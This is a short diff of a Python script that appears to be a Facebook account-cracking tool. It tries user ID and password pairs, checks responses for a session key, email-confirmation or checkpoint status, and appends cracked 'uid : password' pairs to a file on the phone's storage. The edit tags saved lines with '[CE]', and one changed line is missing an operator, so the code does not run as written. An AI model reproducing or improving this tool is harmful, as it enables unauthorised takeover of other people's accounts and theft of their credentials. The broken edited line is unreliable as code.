@@ -212,12 +212,12 @@ def file_subb(uid,pwx):
             q=json.loads(p)
             if "session_key" in q:
                 print(f"\r\r\033[0;36m  [OK] {uid} : {ps}")
-                open("/sdcard/goxdies.txt","a+").write(uid+" : "+ps+"\n")
+                open("/sdcard/goxdies.txt","a+").write("[CE]" uid+" : "+ps+"\n")
                 oks.append(uid)
                 break
             elif "Please Confirm Email" in q:
                 print(f"\r\r\033[94m  [CE] {uid} : {ps}\n")
-                open("/sdcard/goxdies.txt","a+").write(uid+" : "+ps+"\n")
+                open("/sdcard/goxdies.txt","a+").write("[CE]" +uid+" : "+ps+"\n")
                 oks.append(uid)
             elif "www.facebook.com" in q:
                 print(f"\r\r\033[1;91m  [CP] {uid} : {ps}")
